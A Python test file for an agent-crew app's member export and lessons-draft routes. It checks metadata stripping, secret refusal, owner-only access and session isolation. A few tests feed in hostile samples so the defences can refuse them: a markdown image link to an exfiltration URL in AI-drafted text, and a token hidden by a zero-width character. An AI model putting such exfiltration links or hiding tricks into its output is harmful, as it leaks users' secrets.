    assert ex.plan_fingerprint(first) != ex.plan_fingerprint(second)
    assert ex.preview(first)["avatar_digest"] != ex.preview(second)["avatar_digest"]
    assert len(ex.preview(first)["avatar_digest"]) == 64


def test_avatar_digest_uses_exported_content_and_canonical_traits() -> None:
    first, _ = _build(_sources(avatar={"kind": "image"}, avatar_image=_png()))
    metadata, _ = _build(
        _sources(avatar={"kind": "image"}, avatar_image=_png(_chunk(b"tEXt", b"ignored")))
    )
    assert ex.preview(first)["avatar_digest"] == ex.preview(metadata)["avatar_digest"]
    ghosts = [
        _build(_sources(avatar={"kind": "ghost", "traits": traits}))[0]
        for traits in ({"eyes": "round", "hat": True}, {"hat": True, "eyes": "round"})
    ]
    assert ex.preview(ghosts[0])["avatar_digest"] == ex.preview(ghosts[1])["avatar_digest"]
    assert ex.preview(_build(_sources())[0])["avatar_digest"] == ""


def test_picture_metadata_never_travels() -> None:
    """An upload is stored as sent; its text chunks, EXIF and XMP stay home."""
    secret = TOKEN.encode()
    png = _png(_chunk(b"tEXt", b"Comment\x00" + secret), _chunk(b"iTXt", secret))
    _plan, entries = _build(_sources(avatar={"kind": "image"}, avatar_image=png))
    assert secret not in entries["avatar.png"] and entries["avatar.png"] == _png()
    exif = b"\xff\xe1" + (len(secret) + 8).to_bytes(2, "big") + b"Exif\x00\x00" + secret
    com = b"\xff\xfe" + (len(secret) + 2).to_bytes(2, "big") + secret
    scan = b"\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00" + b"\x12\x34" + b"\xff\xd9"
    jpg = b"\xff\xd8" + exif + com + scan
    _plan, entries = _build(_sources(avatar={"kind": "image"}, avatar_image=jpg))
    assert entries["avatar.jpg"] == b"\xff\xd8" + scan
    vp8x = b"VP8X" + (10).to_bytes(4, "little") + bytes([0x0C]) + b"\x00" * 9
    vp8 = b"VP8 " + (4).to_bytes(4, "little") + b"\x01\x02\x03\x04"
    meta = b"EXIF" + len(secret).to_bytes(4, "little") + secret
    body = b"WEBP" + vp8x + vp8 + meta
    webp = b"RIFF" + len(body).to_bytes(4, "little") + body
    _plan, entries = _build(_sources(avatar={"kind": "image"}, avatar_image=webp))
    out = entries["avatar.webp"]
    assert secret not in out and out[20] == 0
    assert int.from_bytes(out[4:8], "little") + 8 == len(out)


def test_bytes_hidden_after_the_image_data_never_travel() -> None:
    secret = TOKEN.encode()
    # PNG: bytes after the zlib stream inside IDAT.
    idat = _chunk(b"IDAT", zlib.compress(b"\x00\x00") + secret)
    ihdr = _chunk(b"IHDR", (1).to_bytes(4, "big") * 2 + bytes([8, 0, 0, 0, 0]))
    png = b"\x89PNG\r\n\x1a\n" + ihdr + idat + _chunk(b"IEND", b"")
    assert ex.portable_image("png", png) == _png()
    # JPEG: a COM segment between two scans, and a trailer after end-of-image.
    sos = b"\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00"
    com = b"\xff\xfe" + (len(secret) + 2).to_bytes(2, "big") + secret
    jpg = (
        b"\xff\xd8"
        + sos
        + b"\x12\xff\x00\x34\xff\xd0\x56"
        + com
        + sos
        + b"\x78"
        + b"\xff\xd9"
        + secret
    )
    out = ex.portable_image("jpg", jpg)
    assert out == b"\xff\xd8" + sos + b"\x12\xff\x00\x34\xff\xd0\x56" + sos + b"\x78\xff\xd9"
    # WEBP: an ICC profile and an unknown chunk.
    vp8x = b"VP8X" + (10).to_bytes(4, "little") + bytes([0x20]) + b"\x00" * 9
    vp8 = b"VP8 " + (4).to_bytes(4, "little") + b"\x01\x02\x03\x04"
    iccp = b"ICCP" + len(secret).to_bytes(4, "little") + secret
    odd = b"ZZZZ" + len(secret).to_bytes(4, "little") + secret
    body = b"WEBP" + vp8x + iccp + vp8 + odd
    out = ex.portable_image("webp", b"RIFF" + len(body).to_bytes(4, "little") + body)
    assert out is not None and secret not in out and out[20] == 0
    # An animated WEBP nests chunks inside each frame: it stays home whole.
    anmf = b"ANMF" + (len(iccp)).to_bytes(4, "little") + iccp
    body = b"WEBP" + vp8x + anmf
    assert ex.portable_image("webp", b"RIFF" + len(body).to_bytes(4, "little") + body) is None


def test_a_token_split_by_an_invisible_character_is_still_refused() -> None:
    split = TOKEN[:6] + "\u200b" + TOKEN[6:]
    assert ex.text_refusal(f"use {split}") == ex.REASON_CREDENTIAL
    assert ex.text_refusal("ordinary text with a zero\u200bwidth space") is None


def test_an_mcp_server_or_key_named_like_a_secret_is_not_shown() -> None:
    spec = {"mcpServers": {TOKEN: {"env": {"A": "x"}}, "ok": {"env": {TOKEN: "x", "B": "y"}}}}
    rows = ex.mcp_placeholder_rows(ex.agent_part(spec))
    assert rows == [{"server": "ok", "placeholders": ["env.B"]}]


def test_only_the_first_goal_travels_and_the_rest_are_named() -> None:
    goals = {
        "goals": [{"id": "g00000001", "text": "First"}, {"id": "g00000002", "text": "Second"}],
        "key_results": [
            {"id": "k1", "text": "For second", "target": "x", "goal_ids": ["g00000002"]}
        ],
    }
    plan, entries = _build(_sources(goals=goals))
    assert json.loads(entries["goals.json"]) == {"longTerm": "First", "keyResults": []}
    assert ("goals", "", ex.REASON_FIRST_GOAL_ONLY) in _reasons(plan)


def test_schedules_and_their_scripts_stay_inside_the_entry_cap() -> None:
    root = _crons_root()
    jobs = []
    for i in range(70):
        (root / f"s{i:02d}.py").write_text("def run(): pass\n", encoding="utf-8", newline="")
        jobs.append(
            {
                "name": f"c{i:02d}",
                "message": "",
                "schedule": {"kind": "cron", "cron_expr": "0 9 * * *"},
                "script": f"{root}/s{i:02d}.py:run",
            }
        )
    plan, entries = _build(_sources(crons=jobs, crons_root=root))
    assert len(entries) <= ex.MAX_ENTRIES
    scripts = {n for n in entries if n.startswith("crons/")}
    named = {"crons/" + c["script"].split(":", 1)[0] for c in json.loads(entries["crons.json"])}
    assert scripts == named
    assert sum(i.reason == ex.REASON_BUNDLE_FULL for i in plan.left_out) == 70 - len(named)


def test_a_non_ascii_name_is_utf8_in_the_file_and_in_the_download_name() -> None:
    plan, entries = _build(_sources(name="发布队长", description="Ünïcode ✓"))
    manifest = json.loads(entries["crewmate.json"].decode("utf-8"))
    assert manifest["name"] == "发布队长" and manifest["description"] == "Ünïcode ✓"
    assert "发布队长".encode("utf-8") in entries["crewmate.json"]
    header = ex.content_disposition(plan.name)
    header.encode("latin-1")  # an HTTP header value must be latin-1 safe
    assert 'filename="crewmate.crewmate"' in header
    assert "filename*=UTF-8''%E5%8F%91%E5%B8%83%E9%98%9F%E9%95%BF.crewmate" in header
    assert all(n.isascii() for n in entries)


def test_a_credential_shaped_name_refuses_the_export() -> None:
    with pytest.raises(ex.ExportRefused):
        ex.plan_export(_sources(name=TOKEN), MEMBER, ex.ExportChoices())


# ── Phase 1's reader on main ──


def test_the_written_file_is_accepted_by_the_phase_1_reader() -> None:
    """Every part the writer emits reads back through Phase 1's ``crewmate_import_params``."""
    root = _crons_root()
    (root / "notes.py").write_text("def run(): pass\n", encoding="utf-8", newline="")
    src = _sources(
        avatar={"kind": "ghost", "traits": {"eyes": "round"}},
        model="claude-sonnet",
        reasoning_effort="medium",
        dashboard_builtin="builtin:release-board",
        rules="be careful",
        goals={
            "goals": [{"id": "g00000001", "text": "Ship release notes"}],
            "key_results": [
                {"id": "k00000001", "text": "Notes out", "target": "weekly", "goal_ids": []}
            ],
        },
        crons=[
            {
                "name": "notes",
                "message": "",
                "schedule": {"kind": "cron", "cron_expr": "0 9 * * *"},
                "script": f"{root}/notes.py:run",
            }
        ],
        crons_root=root,
        agent_spec=SPEC,
    )
    plan = ex.plan_export(src, MEMBER, ex.ExportChoices())
    # The whole file through Phase 1's own zip reader, so its scripts pair as on import.
    parsed = read_crewmate_file(ex.write_bundle(plan))
    params = crewmate_import_params(parsed.bundle, parsed)
    assert params["name"] == "Scout" and params["goal"] == "Ship release notes"
    assert params["rules"] == "be careful"
    [cron] = params["crons"]
    assert cron["name"] == "notes" and cron["cron_expr"] == "0 9 * * *"


# ── the route ──


@web.middleware
async def _auth(request: web.Request, handler):
    who = request.headers.get("X-Test-Auth", "")
    if who == "owner":
        request["user"], request["app"] = "local-app", ""
    elif who == "app":
        request["user"], request["app"] = "local-app", "some-app"
    elif who == "internal":
        # What token_auth leaves after an X-Internal-Secret match: the claim absent.
        request["internal_auth"] = True
        request["user"] = "local-app"
    elif who == "agent":
        request["internal_auth"] = True
        request["peer_verified"] = True
    elif who == "colleague":
        request["user"], request["app"] = "U-colleague", ""
    return await handler(request)


class _Crons:
    def __init__(self, jobs: list[CronJob]) -> None:
        self.jobs = jobs

    async def list_jobs_async(self, include_disabled: bool = False) -> list[CronJob]:
        return list(self.jobs)


class _State:
    owner_id = ""

    def __init__(self, jobs: list[CronJob]) -> None:
        self.crons = _Crons(jobs)


@pytest.fixture
def seeded(monkeypatch: pytest.MonkeyPatch) -> str:
    class _Null:
        def log_api_access(self, **_kw: Any) -> None:
            return None

    import kiro_crew.sel as sel_mod

    monkeypatch.setattr(sel_mod, "sel", lambda: _Null())
    cfg = KiroCrewConfig()
    cfg.agents = {
        "kirocrew": KiroCrewAgentConfig(kiro_agent="kirocrew"),
        MEMBER: KiroCrewAgentConfig(
            kiro_agent="kirocrew",
            display_name="Scout",
            description="Watches.",
            workspace="scout-ws",
        ),
    }
    cfg.workspaces["scout-ws"] = WorkspaceConfig(dir=str(config_dir() / "scout-ws"))
    cfg.default_agent = "kirocrew"
    cfg.save()
    _invalidate_config_cache()
    slug = members_mod.member_slug(MEMBER)
    member_goals.set_goal(slug, MEMBER, "Ship release notes", by=member_goals.BY_USER)
    return slug


def _member_skills() -> Path:
    """``<the seeded mate's own workspace>/.kiro/skills``, made if absent."""
    cfg = KiroCrewConfig.load()
    entry = cfg.workspaces[cfg.agents[MEMBER].workspace]
    root = workspace_dir_from_entry(entry) / ".kiro" / "skills"
    root.mkdir(parents=True, exist_ok=True)
    return root


def _call(slug: str, body: dict[str, Any], who: str, jobs: list[CronJob] | None = None):
    async def main():
        app = web.Application(middlewares=[_auth])
        app["state"] = _State(jobs or [])
        app.router.add_post("/api/members/{slug}/export", member_export.api_member_export)
        client = TestClient(TestServer(app))
        await client.start_server()
        try:
            r = await client.post(
                f"/api/members/{slug}/export", json=body, headers={"X-Test-Auth": who}
            )
            return r.status, dict(r.headers), await r.read()
        finally:
            await client.close()

    return asyncio.run(main())


@pytest.mark.parametrize("who", ["app", "internal", "agent", "colleague", ""])
def test_the_route_answers_403_to_everyone_but_the_owner(seeded: str, who: str) -> None:
    status, _h, body = _call(seeded, {"member": MEMBER}, who)
    assert status in (401, 403), body
    assert b"PK" not in body[:2]


def _tree(root: Path) -> dict[str, float]:
    return {str(p): p.stat().st_mtime_ns for p in root.rglob("*") if p.is_file()}


def test_the_owner_downloads_a_file_and_nothing_is_written_on_the_server(seeded: str) -> None:
    root = _crons_root()
    (root / "notes.py").write_text("def run(): pass\n", encoding="utf-8", newline="")
    skills = _member_skills()
    skills.mkdir(parents=True, exist_ok=True)
    _skill(skills, "triage", {"SKILL.md": "# Triage"})
    jobs = [
        CronJob(
            id="j1",
            name="notes",
            message="",
            schedule=CronSchedule(kind="cron", cron_expr="0 9 * * *"),
            agent_id=MEMBER,
            script=f"{root}/notes.py:run",
        ),
        CronJob(
            id="j2",
            name="other",
            message="hi",
            schedule=CronSchedule(kind="cron", cron_expr="0 9 * * *"),
            agent_id="someone-else",
        ),
    ]
    before = _tree(config_dir())
    status, headers, body = _call(seeded, {"member": MEMBER, "preview": True}, "owner", jobs)
    assert status == 200
    view = json.loads(body)
    assert [c["name"] for c in view["crons"]] == ["notes"]
    assert view["skills"][0]["name"] == "triage"
    assert view["goals"]["longTerm"] == "Ship release notes"
    status, headers, body = _call(seeded, {"member": MEMBER}, "owner", jobs)
    assert status == 200
    assert headers["Content-Disposition"].startswith('attachment; filename="Scout.crewmate"')
    assert headers["Cache-Control"] == "no-store"
    entries = _zip(body)
    assert {
        "crewmate.json",
        "agent.json",
        "goals.json",
        "crons.json",
        "crons/notes.py",
        "skills/triage/SKILL.md",
    } <= set(entries)
    assert _tree(config_dir()) == before


def test_a_download_bound_to_a_preview_is_refused_when_a_file_changed(seeded: str) -> None:
    skills = _member_skills()
    skills.mkdir(parents=True, exist_ok=True)
    d = _skill(skills, "triage", {"SKILL.md": "# Triage"})
    status, _h, body = _call(seeded, {"member": MEMBER, "preview": True}, "owner")
    assert status == 200
    shown = json.loads(body)["fingerprint"]
    status, _h, data = _call(seeded, {"member": MEMBER, "confirm": shown}, "owner")
    assert status == 200 and _zip(data)["skills/triage/SKILL.md"] == b"# Triage"
    (d / "SKILL.md").write_text("# Triage, edited after the view", encoding="utf-8", newline="")
    status, _h, body = _call(seeded, {"member": MEMBER, "confirm": shown}, "owner")
    assert status == 409 and json.loads(body)["code"] == "plan_changed"


def test_the_route_refuses_a_member_the_slug_does_not_name(seeded: str) -> None:
    status, _h, _b = _call(seeded, {"member": "kirocrew"}, "owner")
    assert status == 404
    status, _h, _b = _call(seeded, {"member": MEMBER, "crons": "yes"}, "owner")
    assert status == 400


# ── the lessons draft: one tool-less turn, nothing stored ──


class _Sessions:
    """The session manager the draft route takes its one session from.

    It keeps a conversation per key until that key is destroyed, the way a
    provider-backed background entry keeps one conversation across turns, so a
    route that reused a key would show the earlier turn in the later one's history.
    """

    def __init__(self) -> None:
        self.created: list[str] = []
        self.released: list[str] = []
        self.destroyed: list[str] = []
        self.conversations: dict[str, list[str]] = {}
        self.kw: list[dict[str, Any]] = []
        self.transcripts_removed: list[str] = []

    async def get_or_create(self, key: str, **kw: Any):
        self.created.append(key)
        self.kw.append(kw)
        self.conversations.setdefault(key, [])
        return _Conversation(self.conversations[key], f"sid-{key}", self), True, False

    def release(self, key: str) -> None:
        self.released.append(key)

    async def destroy(self, key: str) -> None:
        self.destroyed.append(key)
        self.conversations.pop(key, None)

    async def get_bg_session(self, **_kw: Any):
        raise AssertionError("a lessons draft must never take the shared background session")


class _Conversation:
    """One provider's conversation: every prompt it was sent, in order."""

    def __init__(self, history: list[str], session_id: str, sessions: _Sessions) -> None:
        self.history = history
        self.session_id = session_id
        self._sessions = sessions

    async def cleanup_session(self, session_id: str) -> None:
        self._sessions.transcripts_removed.append(session_id)


def _draft(slug: str, who: str, sessions: _Sessions, member: str = MEMBER):
    async def main():
        app = web.Application(middlewares=[_auth])
        state = _State([])
        state.sessions = sessions  # type: ignore[attr-defined]
        app["state"] = state
        app.router.add_post(
            "/api/members/{slug}/export/lessons-draft",
            member_export.api_member_export_lessons_draft,
        )
        client = TestClient(TestServer(app))
        await client.start_server()
        try:
            r = await client.post(
                f"/api/members/{slug}/export/lessons-draft",
                json={"member": member},
                headers={"X-Test-Auth": who},
            )
            return r.status, await r.json()
        finally:
            await client.close()

    return asyncio.run(main())


@pytest.mark.parametrize("who", ["app", "internal", "agent", "colleague"])
def test_the_lessons_draft_is_owner_only(seeded: str, who: str) -> None:
    sessions = _Sessions()
    status, _body = _draft(seeded, who, sessions)
    assert status in (401, 403)
    assert sessions.created == []


def test_a_crewmate_on_global_memory_gets_no_draft(seeded: str) -> None:
    sessions = _Sessions()
    status, body = _draft(seeded, "owner", sessions)
    assert status == 409 and body["code"] == "no_private_memory"
    assert sessions.created == []


def _fake_draft(monkeypatch: pytest.MonkeyPatch, answer: str) -> dict[str, Any]:
    """Stub the store read and the model turn; record what the route handed them.

    The store is ``<member>-store`` and its lessons name the member, so a draft that
    saw another member's turn would show that member's lessons in its history.
    """
    import kiro_crew.llm_helpers as llm
    import kiro_crew.memory_stores as stores

    seen: dict[str, Any] = {"histories": []}

    async def lessons(store: str) -> str:
        seen["store"] = store
        return f"- Lesson of {store}: check the release branch first."

    async def turn(provider: Any, prompt: str, **kw: Any) -> str:
        if kw.get("on_chunk") is not None:
            kw["on_chunk"](answer)
        provider.history.append(prompt)
        seen["histories"].append(list(provider.history))
        seen["prompt"] = prompt
        seen["kw"] = kw
        return answer

    monkeypatch.setattr(
        stores, "require_member_memory_store", lambda _cfg, member, **_k: f"{member}-store"
    )
    monkeypatch.setattr(member_export, "_member_lessons", lessons)
    # member_export imports it from llm_helpers at call time, so this is where it resolves.
    monkeypatch.setattr(llm, "stream_and_collect", turn)
    return seen


@pytest.mark.parametrize(
    "answer, code",
    [
        (f"# Lessons\n- Key {TOKEN}\n", "draft_credential"),
        ("# Lessons\n- bell\x07\n", "draft_control_chars"),
        ("x" * (ex.MAX_FILE_BYTES + 1), "draft_too_large"),
        (f"# Lessons\n- See ![x]({EXFIL_URL})\n", "draft_exfil_url"),
    ],
    ids=["credential", "control", "oversize", "exfil"],
)
def test_a_draft_that_fails_the_skill_file_bar_is_refused(
    seeded: str, monkeypatch: pytest.MonkeyPatch, answer: str, code: str
) -> None:
    _fake_draft(monkeypatch, answer)
    status, body = _draft(seeded, "owner", _Sessions())
    assert status == 422 and body["code"] == code
    assert TOKEN not in json.dumps(body)


def test_the_draft_runs_one_tool_less_turn_and_stores_nothing(
    seeded: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    seen = _fake_draft(monkeypatch, "```markdown\n# Lessons\n- Check first.\n```")
    sessions = _Sessions()
    before = _tree(config_dir())
    status, body = _draft(seeded, "owner", sessions)
    assert status == 200
    assert body["text"] == "# Lessons\n- Check first."
    assert seen["store"] == f"{MEMBER}-store"
    assert (
        f"<LESSONS>\n- Lesson of {MEMBER}-store: check the release branch first.\n</LESSONS>"
        in seen["prompt"]
    )
    from kiro_crew.llm_helpers import ToolApprovalPolicy

    # Tool-free twice over: the tool-less agent, and every permission request refused.
    assert sessions.kw[0]["agent"] == "kirocrew-lite"
    assert seen["kw"]["approval_policy"] is ToolApprovalPolicy.REJECT_ALL
    # Its own session, released and destroyed once the turn is over.
    [key] = sessions.created
    assert key.startswith("crewmate-export-lessons:")
    assert sessions.released == [key] and sessions.destroyed == [key]
    assert sessions.conversations == {}
    # Its native transcript too: it holds the lessons and the draft.
    assert sessions.transcripts_removed == [f"sid-{key}"]
    assert _tree(config_dir()) == before


def test_two_drafts_for_two_mates_share_no_conversation(
    seeded: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Mate A's lessons never reach mate B's draft, or any turn after it.

    On a backend whose background turns share one provider conversation, a draft
    run there would leave A's lessons in the conversation B's draft is sent on.
    """
    cfg = KiroCrewConfig.load()
    cfg.agents["ranger"] = KiroCrewAgentConfig(kiro_agent="kirocrew", display_name="Ranger")
    cfg.save()
    _invalidate_config_cache()
    seen = _fake_draft(monkeypatch, "# Lessons\n- Check first.")
    sessions = _Sessions()
    status_a, _ = _draft(seeded, "owner", sessions, member=MEMBER)
    status_b, _ = _draft(members_mod.member_slug("ranger"), "owner", sessions, member="ranger")
    assert status_a == status_b == 200
    first, second = seen["histories"]
    # Each draft was the first and only prompt of its own conversation.
    assert len(first) == 1 and f"{MEMBER}-store" in first[0]
    assert len(second) == 1 and "ranger-store" in second[0]
    assert f"{MEMBER}-store" not in second[0]
    key_a, key_b = sessions.created
    assert key_a != key_b
    # Both conversations are gone, so no later turn can read either.
    assert sessions.destroyed == [key_a, key_b]
    assert sessions.conversations == {}


def test_a_draft_that_fails_still_destroys_its_session(
    seeded: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    import kiro_crew.llm_helpers as llm

    _fake_draft(monkeypatch, "unused")

    async def boom(*_a: Any, **_k: Any) -> str:
        raise RuntimeError("backend gone")

    monkeypatch.setattr(llm, "stream_and_collect", boom)
    sessions = _Sessions()
    status, body = _draft(seeded, "owner", sessions)
    assert status == 502 and body["code"] == "draft_failed"
    assert sessions.destroyed == sessions.created and len(sessions.created) == 1
    assert sessions.transcripts_removed == [f"sid-{sessions.created[0]}"]


def test_a_record_naming_another_mates_private_store_gets_no_draft(seeded: str) -> None:
    """The store is resolved through the ownership check, never read off the record."""
    from kiro_crew.config.loader import MemoryStoreConfig

    cfg = KiroCrewConfig.load()
    cfg.memory_stores["other-1"] = MemoryStoreConfig(memory_version=2, owner_member_id="other")
    cfg.agents[MEMBER].memory_store = "other-1"
    cfg.agents[MEMBER].member_id = "scout"
    cfg.save()
    _invalidate_config_cache()
    sessions = _Sessions()
    status, body = _draft(seeded, "owner", sessions)
    assert status == 409 and body["code"] == "no_private_memory"
    assert sessions.created == []
